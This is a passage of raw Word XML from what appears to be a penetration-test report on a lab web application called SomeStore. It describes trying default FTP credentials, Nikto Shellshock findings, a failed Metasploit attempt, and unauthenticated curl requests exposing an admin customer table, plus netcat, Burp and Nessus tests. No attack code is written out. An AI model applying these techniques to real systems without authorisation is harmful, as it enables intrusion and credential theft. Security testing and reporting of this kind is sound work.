            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251675648" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="12406560" wp14:editId="7A19CD69">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5943600" cy="5550535"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTight wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="0" y="0"/>
                    <wp:lineTo x="0" y="21499"/>
                    <wp:lineTo x="21531" y="21499"/>
                    <wp:lineTo x="21531" y="0"/>
                    <wp:lineTo x="0" y="0"/>
                  </wp:wrapPolygon>
                </wp:wrapTight>
                <wp:docPr id="83" name="Group 83"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup">
                    <wpg:wgp>
                      <wpg:cNvGrpSpPr/>
                      <wpg:grpSpPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="5943600" cy="5550535"/>
                          <a:chOff x="0" y="0"/>
                          <a:chExt cx="5943600" cy="5550535"/>
                        </a:xfrm>
                      </wpg:grpSpPr>
                      <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:nvPicPr>
                          <pic:cNvPr id="82" name="Picture 8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4238625"/>
                            <a:ext cx="5943600" cy="1311910"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                      <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:nvPicPr>
                          <pic:cNvPr id="80" name="Picture 8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943600" cy="4253865"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </wpg:wgp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:group w14:anchorId="77627D1D" id="Group 83" o:spid="_x0000_s1026" style="position:absolute;margin-left:0;margin-top:0;width:468pt;height:437.05pt;z-index:251675648" coordsize="59436,55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 o:spid="_x0000_s1027" type="#_x0000_t75" style="position:absolute;top:42386;width:59436;height:13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">
                  <v:imagedata r:id="rId107" o:title=""/>
                  <v:path arrowok="t"/>
                </v:shape>
                <v:shape id="Picture 80" o:spid="_x0000_s1028" type="#_x0000_t75" style="position:absolute;width:59436;height:42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">
                  <v:imagedata r:id="rId108" o:title=""/>
                  <v:path arrowok="t"/>
                </v:shape>
                <w10:wrap type="tight"/>
              </v:group>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>Once the backdoor has been installed, the user can connect to the server from anywhere, until the backdoor is removed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38271918" w14:textId="0C4AEECE" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="00AE39FB"/>
    <w:p w14:paraId="498589C3" w14:textId="3417DA4E" w:rsidR="00AE0968" w:rsidRDefault="00AE0968" w:rsidP="00AE39FB"/>
    <w:p w14:paraId="2274F478" w14:textId="4DE317CC" w:rsidR="00AD6B4F" w:rsidRDefault="00AD6B4F" w:rsidP="00AD6B4F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="45" w:name="_Toc531104364"/>
      <w:r>
        <w:t>Test for Application Server Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
    </w:p>
    <w:p w14:paraId="1C14CD05" w14:textId="6A2CDA55" w:rsidR="00AD6B4F" w:rsidRDefault="00AD6B4F" w:rsidP="00AD6B4F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="46" w:name="_Toc531104365"/>
      <w:r>
        <w:t>Test for Default Credentials</w:t>
      </w:r>
      <w:bookmarkEnd w:id="46"/>
    </w:p>
    <w:p w14:paraId="55C0CBB7" w14:textId="0BBF5059" w:rsidR="00AD6B4F" w:rsidRDefault="002979BD" w:rsidP="00AD6B4F">
      <w:r>
        <w:t xml:space="preserve">From the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="00ED41DA">
        <w:t>map</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00ED41DA">
        <w:t xml:space="preserve"> scan that wa</w:t>
      </w:r>
      <w:r>
        <w:t>s conducted previously (Figure 9</w:t>
      </w:r>
      <w:r w:rsidR="00ED41DA">
        <w:t xml:space="preserve">), it was seen that ports 21, 80, 443 and 3306 </w:t>
      </w:r>
      <w:r w:rsidR="0082495A">
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidR="00ED41DA">
        <w:t xml:space="preserve"> open. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2138AEE8" w14:textId="02B4A76B" w:rsidR="00ED41DA" w:rsidRDefault="00ED41DA" w:rsidP="00AD6B4F">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Using the command line, </w:t>
      </w:r>
      <w:r w:rsidR="0082495A">
        <w:t>a connection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the ftp port was attempted. The username and password used to try and conne</w:t>
      </w:r>
      <w:r w:rsidR="002979BD">
        <w:t>ct to the ftp server was “USER”, and “</w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t>USER</w:t>
      </w:r>
      <w:r w:rsidR="002979BD">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="0033199E" w:rsidRPr="0033199E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0033199E" w:rsidRPr="0033199E">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(FTP Default Credentials)</w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> The username “root” was also attempted, with the password “password”. These attempts were unsuccessful and no further attempts to gain access were made.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C939CE5" w14:textId="4F69C4CC" w:rsidR="00AF7217" w:rsidRDefault="00AF7217" w:rsidP="00AD6B4F">
      <w:r>
        <w:t xml:space="preserve">Access to the MySQL </w:t>
      </w:r>
      <w:r w:rsidR="00B57A48">
        <w:t>database</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> wa</w:t>
      </w:r>
      <w:r w:rsidR="00B57A48">
        <w:t>s attempted using</w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t xml:space="preserve"> SSH with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0033199E">
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidR="00B57A48">
        <w:t>uTTY</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0033199E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0033199E" w:rsidRPr="0033199E">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">(Download </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0033199E" w:rsidRPr="0033199E">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>PuTTY</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0033199E" w:rsidRPr="0033199E">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> - a free SSH and telnet client for Windows, 2018</w:t>
      </w:r>
      <w:r w:rsidR="0033199E" w:rsidRPr="0033199E">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00B57A48">
        <w:t>. However, the connection was refused by the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A04979" w14:textId="05AEEC1B" w:rsidR="00E14EA1" w:rsidRDefault="003A1C4F" w:rsidP="00616D9E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Test for Default Content</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CD70CE" w14:textId="103CA918" w:rsidR="00E14EA1" w:rsidRDefault="003A1C4F" w:rsidP="00AD6B4F">
      <w:r>
        <w:t xml:space="preserve">From the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> scan, it appears the web server may be vulnerable to shellshock. This is derived fr</w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t>om the following output of the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> scan:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30ACE1F0" w14:textId="77777777" w:rsidR="003A1C4F" w:rsidRPr="00D334C2" w:rsidRDefault="003A1C4F" w:rsidP="003A1C4F">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OSVDB-112004: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>-bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>printenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F55E9E" w14:textId="31A68E51" w:rsidR="003A1C4F" w:rsidRDefault="003A1C4F" w:rsidP="00B57A48">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OSVDB-112004: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>-bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>printenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>: Site appears vulnerable to the 'shellshock' vulnerability (</w:t>
      </w:r>
      <w:hyperlink r:id="rId109" w:history="1">
        <w:r w:rsidRPr="00C91D45">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
          </w:rPr>
          <w:t>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760E97D8" w14:textId="77777777" w:rsidR="003A1C4F" w:rsidRPr="00D334C2" w:rsidRDefault="003A1C4F" w:rsidP="003A1C4F">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4681F57F" w14:textId="0E7E2EDE" w:rsidR="003A1C4F" w:rsidRDefault="00196021" w:rsidP="00AD6B4F">
      <w:r>
        <w:t xml:space="preserve">After several attempts to exploit the Somestore Web application, all attempts failed. Metasploit was used to try and gain a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> shell, while using the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>apache_mod_cgi_bash_env_exec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> exploit.</w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t xml:space="preserve"> However,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t>as aforementioned, the</w:t>
      </w:r>
      <w:r w:rsidR="00B57A48">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00B57A48">
        <w:t xml:space="preserve"> attempt</w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00B57A48">
        <w:t xml:space="preserve"> did not succeed</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352FCB9B" w14:textId="4A468106" w:rsidR="00CD374C" w:rsidRDefault="003953D3" w:rsidP="003953D3">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="47" w:name="_Toc531104366"/>
      <w:r>
        <w:t>Test for Dangerous HTTP Methods</w:t>
      </w:r>
      <w:bookmarkEnd w:id="47"/>
    </w:p>
    <w:p w14:paraId="75C0EC06" w14:textId="7DACEF6C" w:rsidR="00FB0F05" w:rsidRDefault="00F84310" w:rsidP="00FB0F05">
      <w:r>
        <w:t>To discover what HTTP methods the server allows, a curl</w:t>
      </w:r>
      <w:r w:rsidR="00C8024C" w:rsidRPr="00C8024C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C8024C" w:rsidRPr="00C8024C">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(curl, 2018)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request was se</w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t xml:space="preserve">nt to the application. Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>43</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shows the outcome of this request. The available methods to use are POST, OPTIONS, GET, HEAD and TRACE</w:t>
      </w:r>
      <w:r w:rsidR="0033199E">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F3C661" w14:textId="77777777" w:rsidR="00F84310" w:rsidRDefault="00F84310" w:rsidP="00F84310">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2E3845DC" wp14:editId="281EC64D">
            <wp:extent cx="5534025" cy="10382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34025" cy="1038225"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="03AC2AAA" w14:textId="0186CB25" w:rsidR="00F84310" w:rsidRDefault="00F84310" w:rsidP="00F84310">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43</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Curl Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D9B6F9" w14:textId="0EF36F06" w:rsidR="00CD7959" w:rsidRDefault="00CD7959" w:rsidP="00CD7959">
      <w:r>
        <w:t>Due to the application using GET requests, a GET request was made to the admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> page</w:t>
      </w:r>
      <w:r w:rsidR="003C102F">
        <w:t xml:space="preserve"> using curl</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This request was opened using the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>xdg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">-open command, and the output was a message </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>saying</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> “You Failed !!” at the top of the page.</w:t>
      </w:r>
      <w:r w:rsidR="003C102F">
        <w:t xml:space="preserve"> However, the entire of the admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003C102F">
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003C102F">
        <w:t xml:space="preserve"> page was still displayed, exce</w:t>
      </w:r>
      <w:r w:rsidR="00C8024C">
        <w:t xml:space="preserve">pt the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C8024C">
        <w:t>css</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C8024C">
        <w:t xml:space="preserve"> and functionality had been removed</w:t>
      </w:r>
      <w:r w:rsidR="003C102F">
        <w:t>. This allowed the link for the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003C102F">
        <w:t>customerTable.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003C102F">
        <w:t xml:space="preserve"> page to be found. Another GET request wa</w:t>
      </w:r>
      <w:r w:rsidR="00CE04F2">
        <w:t>s made, except to the admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CE04F2">
        <w:t>cus</w:t>
      </w:r>
      <w:r w:rsidR="003C102F">
        <w:t>tomerTable.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003C102F">
        <w:t xml:space="preserve"> page. The same result happened as previous, which allowed all of the customer details to be viewed. Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>44</w:t>
      </w:r>
      <w:r w:rsidR="003C102F">
        <w:t xml:space="preserve"> shows all of the usernames and passwords that were found from this page. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D254215" w14:textId="77777777" w:rsidR="003C102F" w:rsidRDefault="003C102F" w:rsidP="003C102F">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70E2BB83" wp14:editId="3FAA4FA4">
            <wp:extent cx="6717862" cy="56197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19210" cy="562088"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="005E4149" w14:textId="409BBC6B" w:rsidR="003C102F" w:rsidRDefault="003C102F" w:rsidP="003C102F">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44</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>- GET request for admin page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E01AA2" w14:textId="1821AB2C" w:rsidR="003C102F" w:rsidRPr="003C102F" w:rsidRDefault="003C102F" w:rsidP="003C102F">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>This process can be repeated to view all the other pages.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65909E4A" w14:textId="63EEEF9F" w:rsidR="003A1C4F" w:rsidRDefault="00014405" w:rsidP="00AD6B4F">
      <w:r>
        <w:t>The TRACE method could potentially be used for cross site tracing, but due to the application already containing cross site scripting, this will not be looked into.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606B9B80" w14:textId="78EA8814" w:rsidR="001B09E7" w:rsidRDefault="001B09E7" w:rsidP="001B09E7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="48" w:name="_Toc531104367"/>
      <w:r>
        <w:t>Test for Proxy Functionality</w:t>
      </w:r>
      <w:bookmarkEnd w:id="48"/>
    </w:p>
    <w:p w14:paraId="2856BC60" w14:textId="7DE3203A" w:rsidR="00014405" w:rsidRDefault="001B09E7" w:rsidP="00AD6B4F">
      <w:r>
        <w:t xml:space="preserve">An attempt to </w:t>
      </w:r>
      <w:r w:rsidR="00C8024C">
        <w:t xml:space="preserve">create a tunnel was made using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C8024C">
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>etcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C8024C" w:rsidRPr="00C8024C">
        <w:t xml:space="preserve">(The GNU </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C8024C" w:rsidRPr="00C8024C">
        <w:t>Netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C8024C" w:rsidRPr="00C8024C">
        <w:t xml:space="preserve"> -- Official homepage, 2018)</w:t>
      </w:r>
      <w:r w:rsidR="00C8024C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and the CONNECT request. However, due to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SomeStore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> web application not employing </w:t>
      </w:r>
      <w:r w:rsidR="00C8024C">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">CONNECT method, the request </w:t>
      </w:r>
      <w:r w:rsidR="00C8024C">
        <w:t>timed out. This can be seen in F</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">igure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>45</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BF89F35" w14:textId="77777777" w:rsidR="001B09E7" w:rsidRDefault="001B09E7" w:rsidP="001B09E7">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C9EC6AC" wp14:editId="03BE0DFD">
            <wp:extent cx="5248275" cy="19526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48275" cy="1952625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDD2A51" w14:textId="42AA9E0A" w:rsidR="001B09E7" w:rsidRDefault="001B09E7" w:rsidP="001B09E7">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45</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - CONNECT request.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4084E5EA" w14:textId="0C5732C1" w:rsidR="00241265" w:rsidRDefault="00241265" w:rsidP="00241265">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="49" w:name="_Toc531104368"/>
      <w:r>
        <w:t>Test for Virtual Hosting Misconfiguration</w:t>
      </w:r>
      <w:bookmarkEnd w:id="49"/>
    </w:p>
    <w:p w14:paraId="0842CE77" w14:textId="5C7A5ACD" w:rsidR="00241265" w:rsidRDefault="00241265" w:rsidP="00241265">
      <w:r>
        <w:t>The http request to the root directory was captured using Burp, sent to</w:t>
      </w:r>
      <w:r w:rsidR="006E3246">
        <w:t xml:space="preserve"> burp repeater, and </w:t>
      </w:r>
      <w:r w:rsidR="00E2240F">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="006E3246">
        <w:t>details about the host header were edited. With a valid host header, the server returns the homepage</w:t>
      </w:r>
      <w:r w:rsidR="0082495A">
        <w:t xml:space="preserve"> of the application, and when an incorrect </w:t>
      </w:r>
      <w:r w:rsidR="006E3246">
        <w:t>host</w:t>
      </w:r>
      <w:r w:rsidR="0082495A">
        <w:t xml:space="preserve"> header</w:t>
      </w:r>
      <w:r w:rsidR="006E3246">
        <w:t xml:space="preserve"> is supplied the server returns a 400 bad request. If the ho</w:t>
      </w:r>
      <w:r w:rsidR="00ED4A45">
        <w:t>st header is completely removed</w:t>
      </w:r>
      <w:r w:rsidR="006E3246">
        <w:t xml:space="preserve"> and HTTP/1.0 is used, then the application still success</w:t>
      </w:r>
      <w:r w:rsidR="00E2240F">
        <w:t xml:space="preserve">fully retrieves the home page. </w:t>
      </w:r>
      <w:r w:rsidR="006E3246">
        <w:t xml:space="preserve">No misconfigurations were </w:t>
      </w:r>
      <w:r w:rsidR="00E2240F">
        <w:t>found</w:t>
      </w:r>
      <w:r w:rsidR="006E3246">
        <w:t xml:space="preserve"> in this stage of testing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D04196A" w14:textId="3485F7D2" w:rsidR="006E3246" w:rsidRDefault="006E3246" w:rsidP="006E3246">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="50" w:name="_Toc531104369"/>
      <w:r>
        <w:t>Test for Webserver Software Bugs</w:t>
      </w:r>
      <w:bookmarkEnd w:id="50"/>
    </w:p>
    <w:p w14:paraId="12810890" w14:textId="0AF9DE33" w:rsidR="006E3246" w:rsidRDefault="00F519AD" w:rsidP="006E3246">
      <w:r>
        <w:t xml:space="preserve">In order to find bugs in the software, a </w:t>
      </w:r>
      <w:r w:rsidR="00D57C95">
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">essus </w:t>
      </w:r>
      <w:r w:rsidR="00E2240F" w:rsidRPr="00E2240F">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(Nessus Professional, 2018)</w:t>
      </w:r>
      <w:r w:rsidR="00E2240F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">scan was carried out. This scan can be seen in </w:t>
      </w:r>
      <w:r w:rsidR="0082495A">
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ppendix F. </w:t>
      </w:r>
      <w:r w:rsidR="008A4195">
        <w:t xml:space="preserve">Not much information was gathered from the SSL scan, as a lot of false positives were found. The Somestore web application does not </w:t>
      </w:r>
      <w:r w:rsidR="0082495A">
        <w:t xml:space="preserve">make </w:t>
      </w:r>
      <w:r w:rsidR="008A4195">
        <w:t>use</w:t>
      </w:r>
      <w:r w:rsidR="0082495A">
        <w:t xml:space="preserve"> of</w:t>
      </w:r>
